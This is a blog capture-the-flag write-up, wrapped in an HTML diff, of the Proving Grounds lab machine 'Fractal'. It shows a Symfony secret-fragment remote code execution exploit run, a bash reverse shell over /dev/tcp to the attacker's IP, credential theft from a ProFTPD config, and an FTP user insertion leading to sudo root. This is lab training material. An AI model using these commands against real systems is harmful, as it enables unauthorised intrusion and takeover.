@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<link href="https://fonts.googleapis.com/css?family=Merriweather:300|Raleway:400,700" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/style.css">
+<title>Proving grounds Play: Fractal</title>
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Proving grounds Play: Fractal | Thevillagehacker’s Blog</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="Proving grounds Play: Fractal" />
+<meta name="author" content="Naveen" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Offsec proving grounds practice linux machine writeup" />
+<meta property="og:description" content="Offsec proving grounds practice linux machine writeup" />
+<link rel="canonical" href="http://localhost:4000/2023/10/14/Proving_grounds_Practice-Fractal.html" />
+<meta property="og:url" content="http://localhost:4000/2023/10/14/Proving_grounds_Practice-Fractal.html" />
+<meta property="og:site_name" content="Thevillagehacker’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-10-14T02:00:00+05:30" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Proving grounds Play: Fractal" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Naveen"},"dateModified":"2023-10-14T02:00:00+05:30","datePublished":"2023-10-14T02:00:00+05:30","description":"Offsec proving grounds practice linux machine writeup","headline":"Proving grounds Play: Fractal","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2023/10/14/Proving_grounds_Practice-Fractal.html"},"url":"http://localhost:4000/2023/10/14/Proving_grounds_Practice-Fractal.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<script type="text/javascript" src="/assets/js/darkmode.js"></script>
+
+</head><body>
+  <main class="container">
+    <section class="about">
+      <div class="about-header condensed">
+      <div class="about-title">
+      <a href="/">
+        
+        <img src="/assets/portfolio.jpg" alt="Naveen Jagadeesan" />
+        
+      </a>
+      <h2 id="title">
+        <a href="/">Naveen Jagadeesan</a>
+      </h2>
+      </div><p class="tagline">Security Analyst. Security Researcher</p></div>
+      
+      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-linkedin-squared"></i>
+          </li>
+        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
+          <li>
+            <i class="icon-twitter-squared"></i>
+          </li>
+        </a></ul><p class="about-footer condensed">&copy;
+        2024</p><div class="about-footer condensed">
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" class="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+    </section>
+    <section class="content">
+      <div class="post-container">
+  <a class="post-link" href="/2023/10/14/Proving_grounds_Practice-Fractal.html">
+    <h2 class="post-title">Proving grounds Play: Fractal</h2>
+  </a>
+  <div class="post-meta">
+    <div class="post-date"><i class="icon-calendar"></i>Oct 14, 2023</div></div>
+  <div class="post">
+    <h2 id="nmap">Nmap</h2>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE VERSION
+21/tcp open  ftp     ProFTPD
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 c1994b952225ed0f8520d363b448bbcf (RSA)
+|   256 0f448badad95b8226af036ac19d00ef3 (ECDSA)
+|_  256 32e12a6ccc7ce63e23f4808d33ce9b3a (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-robots.txt: 2 disallowed entries 
+|_/app_dev.php /app_dev.php/*
+|_http-title: Welcome!
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<h2 id="21tcp-open--ftp---proftpd">21/tcp open  ftp - ProFTPD</h2>
+
+<p>Nothing in here…!</p>
+
+<h2 id="80tcp-open--http---apache-httpd-2441-ubuntu">80/tcp open  http - Apache httpd 2.4.41 ((Ubuntu))</h2>
+
+<p>http://192.168.187.233/</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code># symfony 3.4 robots.txt
+User-agent: *
+Disallow: /app_dev.php
+Disallow: /app_dev.php/*
+</code></pre></div></div>
+<p>http://192.168.187.233/app_dev.php</p>
+
+<p>Upon visiting the URL at the bottom of the page there are several options and informations disclosed. The website is using Symfony 3.4.46 which is vulnerable to <a href="https://github.com/ambionics/symfony-exploits">Remote Code Execution</a>.</p>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<p>Click on the button in the <code class="language-plaintext highlighter-rouge">http://192.168.187.233/app_dev.php</code> page and which will show an URL where it fetches configuration files. In order to successfully exploit the vulnerabiltiy the <code class="language-plaintext highlighter-rouge">secret</code> should be obtained from the <code class="language-plaintext highlighter-rouge">app/config/parameters.yml</code> file.</p>
+
+<p>Visit the below URL to obtain the secret.</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.187.233/app_dev.php/_profiler/open?file=app/config/parameters.yml
+</code></pre></div></div>
+
+<p><strong>Running Exploit</strong></p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>naveenj@hackerspace:|22:50|~/proving_grounds/Fractal/exploit/symfony-exploits<span class="nv">$ </span>python3 secret_fragment_exploit.py http://192.168.187.233/_fragment <span class="nt">-s</span> 48a8538e6260789558f0dfe29861c05b
+The URL /_fragment returns 403, cool
+
+Trying 4 mutations...
+  <span class="o">(</span>OK<span class="o">)</span> sha256 48a8538e6260789558f0dfe29861c05b http://192.168.187.233/_fragment 404 http://192.168.187.233/_fragment?_path<span class="o">=</span>&amp;_hash<span class="o">=</span>pJg5Iqk0DEkiGH%2B9AiIFPmO6KY7EtvD64sHvSReQyfA%3D
+
+Trying both RCE methods...
+  Method 1: Success!
+
+PHPINFO: http://192.168.187.233/_fragment?_path<span class="o">=</span>_controller%3Dphpinfo%26what%3D-1&amp;_hash<span class="o">=</span>4qF0rPIIXEuWrV%2FrR3ubq%2B%2B%2FSyIj1GyfHi%2FIChKUtFM%3D
+RUN: secret_fragment_exploit.py <span class="s1">'http://192.168.187.233/_fragment'</span> <span class="nt">--method</span> 1 <span class="nt">--secret</span> <span class="s1">'48a8538e6260789558f0dfe29861c05b'</span> <span class="nt">--algo</span> <span class="s1">'sha256'</span> <span class="nt">--internal-url</span> <span class="s1">'http://192.168.187.233/_fragment'</span> <span class="nt">--function</span> phpinfo <span class="nt">--parameters</span> what:-1
+</code></pre></div></div>
+
+<p><strong>Verify remote code execution</strong></p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>naveenj@hackerspace:|23:05|~/proving_grounds/Fractal/exploit/symfony-exploits<span class="nv">$ </span>python3 secret_fragment_exploit.py <span class="s1">'http://192.168.187.233/_fragment'</span> <span class="nt">--method</span> 2 <span class="nt">--secret</span> <span class="s1">'48a8538e6260789558f0dfe29861c05b'</span> <span class="nt">--algo</span> <span class="s1">'sha256'</span> <span class="nt">--internal-url</span> <span class="s1">'http://192.168.187.233/_fragment'</span> <span class="nt">--function</span> system <span class="nt">--parameters</span> <span class="s2">"id"</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Fractal/rce.png" alt="img" /></p>
+
+<p><strong>Obtain reverse shell</strong></p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>naveenj@hackerspace:|23:05|~/proving_grounds/Fractal/exploit/symfony-exploits<span class="nv">$ </span>python3 secret_fragment_exploit.py <span class="s1">'http://192.168.187.233/_fragment'</span> <span class="nt">--method</span> 2 <span class="nt">--secret</span> <span class="s1">'48a8538e6260789558f0dfe29861c05b'</span> <span class="nt">--algo</span> <span class="s1">'sha256'</span> <span class="nt">--internal-url</span> <span class="s1">'http://192.168.187.233/_fragment'</span> <span class="nt">--function</span> system <span class="nt">--parameters</span> <span class="s2">"bash -c '/bin/bash -i &gt;&amp; /dev/tcp/192.168.45.245/80 0&gt;&amp;1'"</span>
+</code></pre></div></div>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>naveenj@hackerspace:|05:53|~/proving_grounds/Fractal/exploit/symfony-exploits<span class="nv">$ </span>nc <span class="nt">-lvnp</span> 80
+listening on <span class="o">[</span>any] 80 ...
+connect to <span class="o">[</span>192.168.45.242] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.187.233] 36306
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1012<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+www-data@fractal:/var/www/html/web<span class="nv">$ </span>
+</code></pre></div></div>
+
+<p><strong>Initial Foothold Obtained</strong></p>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<p>As shown in the Nmap results there is a FTP service proftpd is running on port 21 with the mysql module enabled <code class="language-plaintext highlighter-rouge">/etc/proftpd/sql.conf</code>. We can create new user or add user <code class="language-plaintext highlighter-rouge">benoit</code> to the service which will give access to user benoit account.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@fractal:/etc/proftpd<span class="nv">$ </span>ll
+total 1.4M
+4.0K drwxr-xr-x 107 root root 4.0K Sep 27  2022 ..
+4.0K <span class="nt">-rw-r--r--</span>   1 root root 2.9K Sep 27  2022 modules.conf
+4.0K drwxr-xr-x   3 root root 4.0K Sep 27  2022 <span class="nb">.</span>
+8.0K <span class="nt">-rw-r--r--</span>   1 root root 5.7K Sep 27  2022 proftpd.conf
+4.0K <span class="nt">-rw-r--r--</span>   1 root root 1.2K Sep 27  2022 sql.conf    <span class="c">#sql config file</span>
+4.0K <span class="nt">-rw-r--r--</span>   1 root root 2.1K Sep 27  2022 tls.conf
+4.0K <span class="nt">-rw-r--r--</span>   1 root root  832 Sep 27  2022 virtuals.conf
+4.0K <span class="nt">-rw-------</span>   1 root root  701 Sep 27  2022 ldap.conf
+1.3M <span class="nt">-rw-r--r--</span>   1 root root 1.3M Feb 27  2020 blacklist.dat
+4.0K drwxr-xr-x   2 root root 4.0K Feb 27  2020 conf.d
+ 12K <span class="nt">-rw-r--r--</span>   1 root root 9.2K Feb 27  2020 dhparams.pem
+www-data@fractal:/etc/proftpd<span class="err">$</span>
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">sql.conf</code> has database credentials, extratct the credentials and login via mysql.</p>
+
+<div class="language-conf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># used to connect to the database 
+# databasename@host database_user user_password 
+</span><span class="n">SQLConnectInfo</span> <span class="n">proftpd</span>@<span class="n">localhost</span> <span class="n">proftpd</span> <span class="n">protfpd_with_MYSQL_password</span>
+</code></pre></div></div>
+
+<p>Credentials = <code class="language-plaintext highlighter-rouge">proftpd:protfpd_with_MYSQL_password</code></p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@fractal:/etc/proftpd<span class="nv">$ </span>mysql <span class="nt">-uproftpd</span> <span class="nt">-pprotfpd_with_MYSQL_password</span>
+mysql: <span class="o">[</span>Warning] Using a password on the <span class="nb">command </span>line interface can be insecure.
+Welcome to the MySQL monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span><span class="nb">.</span>
+Your MySQL connection <span class="nb">id </span>is 11
+Server version: 8.0.30-0ubuntu0.20.04.2 <span class="o">(</span>Ubuntu<span class="o">)</span>
+
+Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2022, Oracle and/or its affiliates.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type <span class="s1">'help;'</span> or <span class="s1">'\h'</span> <span class="k">for </span>help. Type <span class="s1">'\c'</span> to clear the current input statement.
+
+mysql&gt; 
+</code></pre></div></div>
+
+<p>Please refer <a href="https://medium.com/@nico26deo/how-to-set-up-proftpd-with-a-mysql-backend-on-ubuntu-c6f23a638caf">here</a> for more info on creating user for proftpd using mysql.</p>
+
+<h3 id="adding-user">Adding User</h3>
+
+<p>Use the below to generate the password.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/echo <span class="s2">"{md5}"</span><span class="sb">`</span>/bin/echo <span class="nt">-n</span> <span class="s2">"password"</span> | openssl dgst <span class="nt">-binary</span> <span class="nt">-md5</span> | openssl enc <span class="nt">-base64</span><span class="sb">`</span>
+</code></pre></div></div>
+
+<p><strong>Updating table</strong></p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; <span class="k">select</span> <span class="k">*</span> from ftpuser<span class="p">;</span>
++----+--------+-------------------------------+-----+-----+---------------+---------------+-------+---------------------+---------------------+
+| <span class="nb">id</span> | userid | passwd                        | uid | gid | homedir       | shell         | count | accessed            | modified            |
++----+--------+-------------------------------+-----+-----+---------------+---------------+-------+---------------------+---------------------+
+|  1 | www    | <span class="o">{</span>md5<span class="o">}</span><span class="nv">RDLDFEKYiwjDGYuwpgb7Cw</span><span class="o">==</span> |  33 |  33 | /var/www/html | /sbin/nologin |     0 | 2022-09-27 05:26:29 | 2022-09-27 05:26:29 |
++----+--------+-------------------------------+-----+-----+---------------+---------------+-------+---------------------+---------------------+
+1 row <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
+
+mysql&gt; INSERT INTO <span class="sb">`</span>ftpuser<span class="sb">`</span> <span class="o">(</span><span class="sb">`</span><span class="nb">id</span><span class="sb">`</span>, <span class="sb">`</span>userid<span class="sb">`</span>, <span class="sb">`</span>passwd<span class="sb">`</span>, <span class="sb">`</span>uid<span class="sb">`</span>, <span class="sb">`</span>gid<span class="sb">`</span>, <span class="sb">`</span>homedir<span class="sb">`</span>, <span class="sb">`</span>shell<span class="sb">`</span>, <span class="sb">`</span>count<span class="sb">`</span>, <span class="sb">`</span>accessed<span class="sb">`</span>, <span class="sb">`</span>modified<span class="sb">`</span><span class="o">)</span>
+    -&gt; VALUES <span class="o">(</span>NULL, <span class="s1">'benoit'</span>, <span class="s1">'{md5}X03MO1qnZdYdgyfeuILPmQ=='</span>, <span class="s1">'1000'</span>, <span class="s1">'1000'</span>, <span class="s1">'/'</span>, <span class="s1">'/bin/bash'</span>, <span class="s1">'0'</span>, <span class="s1">'2023-10-14 05:26:29'</span>, <span class="s1">'2023-10-14 05:26:29'</span><span class="o">)</span><span class="p">;</span>   <span class="c">#query to add user</span>
+Query OK, 1 row affected <span class="o">(</span>0.00 sec<span class="o">)</span>
+
+mysql&gt; <span class="k">select</span> <span class="k">*</span> from ftpuser<span class="p">;</span>
++----+--------+-------------------------------+------+------+---------------+---------------+-------+---------------------+---------------------+
+| <span class="nb">id</span> | userid | passwd                        | uid  | gid  | homedir       | shell         | count | accessed            | modified            |
++----+--------+-------------------------------+------+------+---------------+---------------+-------+---------------------+---------------------+
+|  1 | www    | <span class="o">{</span>md5<span class="o">}</span><span class="nv">RDLDFEKYiwjDGYuwpgb7Cw</span><span class="o">==</span> |   33 |   33 | /var/www/html | /sbin/nologin |     0 | 2022-09-27 05:26:29 | 2022-09-27 05:26:29 |
+|  2 | benoit | <span class="o">{</span>md5<span class="o">}</span><span class="nv">X03MO1qnZdYdgyfeuILPmQ</span><span class="o">==</span> | 1000 | 1000 | /             | /bin/bash     |     0 | 2023-10-14 05:26:29 | 2023-10-14 05:26:29 |
++----+--------+-------------------------------+------+------+---------------+---------------+-------+---------------------+---------------------+
+2 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
+</code></pre></div></div>
+
+<h2 id="21tcp-open--ftp---proftpd-1">21/tcp open  ftp - ProFTPD</h2>
+
+<p>Login to ftp using <code class="language-plaintext highlighter-rouge">benoit:password</code>.</p>
+
+<p>Direct to user <code class="language-plaintext highlighter-rouge">benoit</code> directory and create .ssh folder. Download the local machine public ssh key <code class="language-plaintext highlighter-rouge">id_rsa.pub</code> as authorized_keys into the attacking machine via ftp.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; <span class="nb">cd </span>benoit
+250 CWD <span class="nb">command </span>successful
+ftp&gt; <span class="nb">mkdir</span> .ssh
+257 <span class="s2">"/home/benoit/.ssh"</span> - Directory successfully created
+ftp&gt; <span class="nb">ls
+</span>229 Entering Extended Passive Mode <span class="o">(||</span>|56047|<span class="o">)</span>
+150 Opening ASCII mode data connection <span class="k">for </span>file list
+<span class="nt">-r--r--r--</span>   1 benoit   benoit         33 Oct 15 09:44 local.txt
+226 Transfer <span class="nb">complete
+</span>ftp&gt; <span class="nb">cd</span> .ssh
+250 CWD <span class="nb">command </span>successful
+ftp&gt; put authorized_keys 
+<span class="nb">local</span>: authorized_keys remote: authorized_keys
+229 Entering Extended Passive Mode <span class="o">(||</span>|60851|<span class="o">)</span>
+150 Opening BINARY mode data connection <span class="k">for </span>authorized_keys
+100% |<span class="k">***********************************************************************************************************************************************************************************************</span>|   573       10.50 MiB/s    00:00 ETA
+226 Transfer <span class="nb">complete
+</span>573 bytes sent <span class="k">in </span>00:00 <span class="o">(</span>1.71 KiB/s<span class="o">)</span>
+ftp&gt; 
+</code></pre></div></div>
+
+<p>Now SSH to the user <code class="language-plaintext highlighter-rouge">benoit</code> and run executable permissions list command.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">whoami
+</span>benoit
+<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>benoit<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>benoit<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>benoit<span class="o">)</span>
+<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>benoit on fractal:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User benoit may run the following commands on fractal:
+    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: ALL
+</code></pre></div></div>
+
+<p>The user is allowed to run ALL. Use <code class="language-plaintext highlighter-rouge">sudo su</code> to escalate privileges.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>su
+root@fractal:/home/benoit# <span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+root@fractal:/home/benoit# 
+</code></pre></div></div>
+
+<p><strong>Root Obtained</strong></p>
+
+<h2 id="reference">Reference</h2>
+
+<ul>
+  <li><a href="https://medium.com/@nico26deo/how-to-set-up-proftpd-with-a-mysql-backend-on-ubuntu-c6f23a638caf">https://medium.com/@nico26deo/how-to-set-up-proftpd-with-a-mysql-backend-on-ubuntu-c6f23a638caf</a></li>
+</ul>
+
+<p>Thanks for reading!</p>
+
+<p>For more insights and updates, follow me on Twitter: <a href="https://twitter.com/thevillagehackr">@thevillagehacker</a>.</p>
+
+  </div></div>
+
+    </section>
+    <footer class="condensed">
+      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-linkedin-squared"></i>
+          </li>
+        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
+          <li>
+            <i class="icon-twitter-squared"></i>
+          </li>
+        </a></ul><p class="about-footer condensed">&copy;
+        2024</p><div class="about-footer condensed">
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" class="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+    </footer>
+  </main>
+  
+  <script type="text/javascript" src="/assets/js/darkmode.js"></script>
+  
+  <script src="/assets/js/simple-jekyll-search.min.js"></script>
+  <script src="/assets/js/search.js"></script>
+  
+</body>
+
+</html>
